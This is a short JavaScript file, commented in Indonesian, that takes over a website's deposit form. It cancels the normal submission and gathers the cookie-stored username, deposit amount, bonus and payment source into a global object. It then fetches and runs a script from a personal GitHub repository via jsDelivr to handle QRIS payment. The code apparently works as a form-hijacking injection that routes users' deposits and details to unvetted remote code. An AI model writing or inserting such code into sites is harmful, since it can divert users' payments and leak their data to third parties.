/**
 * deposit_redirect.js
 * Script untuk override form deposit agar submit diarahkan ke 1.js di CDN.
 */
const username = window.SESSION_USER || readCookie("user");
// Baca cookie
function readCookie(name) {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? decodeURIComponent(match[2]) : null;
}

document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("depositForm");
  if (!form) {
    console.warn("Form depositForm tidak ditemukan.");
    return;
  }

  // Ubah action ke file eksternal (CDN)
  form.action = "https://cdn.jsdelivr.net/gh/arceusxyz/moon@main/afteract1.js";

  // Tangkap submit event
  form.addEventListener("submit", function (e) {
    e.preventDefault();

    const username = readCookie("user"); // dari cookie
    const nominal = document.getElementById("nominal")?.value || "";
    const bonus = document.getElementById("bonus")?.value || "";
    const payFrom = form.querySelector("select[name='pay_from']")?.value || "";
    const postID = form.querySelector("input[name='postID']")?.value || "";
    const termCondition = form.querySelector("input[name='termcondition']")?.checked ? 1 : 0;

    // Data form
    const data = {
      username: username,
      nominal: nominal,
      bonus: bonus,
      pay_from: payFrom,
      postID: postID,
      termcondition: termCondition
    };

    console.log("Mengirim data ke 1.js:", data);

    // Buat <script> dinamis untuk load 1.js
    const script = document.createElement("script");
    script.src = form.action;
    script.async = true;

    // Sisipkan data ke global agar bisa dibaca oleh 1.js
    window.depositFormData = data;

    script.onload = function () {
      console.log("File eksternal 1.js berhasil dimuat. Data tersedia di window.depositFormData");
      alert("Form berhasil dikirim. Proses QRIS akan dijalankan dari 1.js");
    };

    script.onerror = function () {
      console.error("Gagal memuat 1.js dari CDN.");
      alert("Gagal memuat script eksternal.");
    };

    document.body.appendChild(script);
  });
});
